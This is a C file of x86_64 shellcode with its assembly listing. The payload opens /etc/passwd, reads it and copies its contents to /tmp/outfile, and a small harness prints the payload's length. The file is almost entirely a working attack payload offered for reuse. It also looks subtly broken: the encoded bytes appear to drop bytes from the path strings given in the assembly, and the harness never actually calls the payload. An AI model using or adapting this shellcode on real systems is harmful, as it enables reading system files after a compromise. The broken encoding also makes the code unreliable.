/*
Reads data from /etc/passwd to /tmp/outfile
No null bytes

Author: Chris Higgins <chris@chigs.me>
        @ch1gg1ns -- github.com/chiggins -- http://chigstuff.com/blog/2014/03/29/my-first-shellcode/
        chigstuff.com
Date:   3-27-2014
Size:   118 bytes
Tested: ArchLinux x86_64 3.13.6-1
Assembly:
        xor rax, rax
        mov al, 2
        xor rdi, rdi
        mov rbx, 0x647773
        push rbx
        mov rbx, 0x7361702f6374652f
        push rbx
        lea rdi, [rsp]
        xor rsi, rsi
        syscall
        mov rbx, rax
        xor rax, rax
        mov rdi, rbx
        mov rsi, rsp
        mov dx, 0xFFFF
        syscall
        mov r8, rax
        mov rax, rsp
        xor rbx, rbx
        push rbx
        mov rbx, 0x656c6966
        push rbx
        mov rbx, 0x74756f2f706d742f
        push rbx
        mov rbx, rax
        xor rax, rax
        mov al, 2
        lea rdi, [rsp]
        xor rsi, rsi
        push 0x66
        pop si
        syscall
        mov rdi, rax
        xor rax, rax
        mov al, 1
        lea rsi, [rbx]
        xor rdx, rdx
        mov rdx, r8
        syscall
*/

#include <stdio.h>
#include <string.h>

char shellcode[] = "\x48\x31\xc0\xb0\x02\x48\x31\xff\xbb\x73\x77\x64\x00\x53\x48\xbb\x2f\x65\x74\x63\x70\x61\x73\x53\x48\x8d\x3c\x24\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89\xe6\x66\xba\xff\xff\x0f\x05\x49\x89\xc0\x48\x89\xe0\x48\x31\xdb\x53\xbb\x66\x69\x6c\x65\x53\x48\xbb\x2f\x74\x6d\x70\x6f\x75\x74\x53\x48\x89\xc3\x48\x31\xc0\xb0\x02\x48\x8d\x3c\x24\x48\x31\xf6\x6a\x66\x66\x5e\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x01\x48\x8d\x33\x48\x31\xd2\x4c\x89\xc2\x0f\x05";

int main() {
    printf("len: %d bytes", sizeof shellcode);
    (*(void (*)()) shellcode);
    return 0;
}